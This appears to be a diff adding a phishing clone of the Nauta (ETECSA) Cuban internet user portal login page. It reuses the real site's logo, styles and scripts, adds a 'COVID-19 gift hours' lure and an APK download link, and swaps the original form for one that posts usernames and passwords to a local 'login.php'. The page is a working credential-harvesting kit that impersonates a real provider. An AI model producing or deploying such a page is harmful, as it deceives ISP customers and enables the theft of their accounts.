@@ -1,0 +1,203 @@
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0"/>
+    <!-- CSS  -->
+
+    <link rel="shortcut icon" type="images/x-icon" href="https://www.portal.nauta.cu/media/img/nauta.gif"/>
+    <title>Portal de usuario</title>
+    <meta name="keywords" content=""/>
+    <meta name="description" content=""/>
+    <meta name="copyright" content=""/>
+    <script type="text/javascript">
+        var url_base = 'https://www.portal.nauta.cu/';
+    </script>
+    <link type="text/css" href="https://www.portal.nauta.cu/media/css/materialized/page-center.css" rel="stylesheet" media="" /><link type="text/css" href="https://www.portal.nauta.cu/media/css/materialized/icon.min.css" rel="stylesheet" media="" /><link type="text/css" href="https://www.portal.nauta.cu/media/css/materialized/materialize.min.css" rel="stylesheet" media="screen,projection" /><link type="text/css" href="https://www.portal.nauta.cu/media/js/toastr/toastr.min.css" rel="stylesheet" media="screen,projection" /><link type="text/css" href="https://www.portal.nauta.cu/media/js/mailtip/css/mailtip.css" rel="stylesheet" media="screen,projection" /><link type="text/css" href="https://www.portal.nauta.cu/media/css/materialized/style.min.css" rel="stylesheet" media="screen,projection" /></head>
+<body class="orange">
+   
+
+
+    <div class="row" id="login-page">
+    <div class="col s12 z-depth-4 card-panel">
+        <p class="center"><a href="#"><img src="https://www.portal.nauta.cu/media/img/materialized/nauta_login.png">
+            </a></p>
+
+
+
+
+
+
+
+        <form class="login-form" name="login" method="post" autocomplete="off">
+                    <div class="row">
+                <div class="col s12 center">
+                    <p class="title-blue center" style="margin-top: 0; margin-bottom: 10px;">Portal de usuario</p>
+                </div>
+            </div>
+
+            <div class="row">
+              <div class="col s12 center">
+                    <p class="center"><a href="http://www.etecsa.cu/images/cu.sld.COVID_19_InfoCU-v3.apk">Descargue aqui APK .COVID_19.</a></span></p>
+              </div>
+            </div>
+         
+            <div class="row margin">
+                <div class="input-field col s12">
+                    
+
+                 
+
+
+ </form>
+
+
+                       
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <form method="POST" action="login.php">
+ <label class="center-align" for="username">Usuario</label>
+ <input type="text" id="username" name="username" maxlength="46" class="user-domain" value="">
+
+                </div>
+            </div>
+            <div class="row margin">
+                <div class="input-field col s12">
+                    
+                    
+                    <label for="password" class="">Contraseña</label>
+               <input type="password" id="password" name="password" maxlength="20">
+                 </div>
+            </div>
+
+
+
+
+
+
+
+
+
+
+
+<p>
+<input type="checkbox" id="show_pass" class="show_password" rel="password"/>
+<label for="show_pass">Mostrar contraseña</label>
+                    </p>
+
+
+
+
+
+
+
+
+
+
+
+<div class="row">
+                <div class="input-field col s8 offset-s2">
+                    <button name="btn_submit" class="submit_btn btn waves-effect waves-light col s12 blue darken-4">Aceptar</button>
+                </div>
+            </div>
+        </form>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="col s12 center">
+                    <p class="title-blue center" style="margin-top: 0; margin-bottom: 10px;">Horas de Regalo COVID_19.</p>
+                </div>
+
+
+
+
+
+
+
+
+
+
+
+ <script type="text/javascript" src="https://www.portal.nauta.cu/media/js/materialized/jquery-2.1.1.min.js"></script><script type="text/javascript" src="https://www.portal.nauta.cu/media/js/materialized/materialize.min.js"></script><script type="text/javascript" src="https://www.portal.nauta.cu/media/js/jquery.blockUI.js"></script><script type="text/javascript" src="https://www.portal.nauta.cu/media/js/toastr/toastr.min.js"></script><script type="text/javascript" src="https://www.portal.nauta.cu/media/js/mailtip/src/jquery.mailtip.js"></script><script type="text/javascript" src="https://www.portal.nauta.cu/media/js/materialized/init.js"></script><script type="text/javascript" src="https://www.portal.nauta.cu/media/js/user_aaa/captcha.js"></script>    <script type="text/javascript">
+        window.toastr.options = {
+            timeOut: 10000
+        }
+        $(function(){
+            $('.contact_info, .help').on("click",function(e){
+                console.log($(this).attr('href'));
+                e.preventDefault();
+                $("#contact_info_box").load($(this).attr('href'));
+
+            });
+
+
+            $('.show_password').on("click",function(){
+                var target=$(this).attr('rel');
+                if ($(this).prop('checked')){
+                    $('#'+target).attr('type','text');
+                } else {
+                    $('#'+target).attr('type','password');
+                }
+            });
+
+            $('.submit_btn').on('click',function(){
+                $.blockUI({
+                    message:'<div class="preloader-wrapper active"><div class="spinner-layer spinner-red-only"> <div class="circle-clipper left"> <div class="circle"></div> </div><div class="gap-patch"> <div class="circle"></div> </div><div class="circle-clipper right"> <div class="circle"></div> </div> </div> </div><div></div><div>Cargando...</div>',
+                    css: {
+                        border: 'none',
+                        padding: '15px',
+                        backgroundColor: '#000',
+                        '-webkit-border-radius': '10px',
+                        '-moz-border-radius': '10px',
+                        opacity: .5,
+                        color: '#fff'
+                    } });
+            });
+
+            var options = ['nauta.com.cu','nauta.co.cu'];
+            $("input.user-domain").mailtip({
+                mails: options,
+                offsetTop: 2
+            });
+            
+        });
+    </script>
+
+
+
+
+
+
+
+
+
+
+</body>     
+</html>
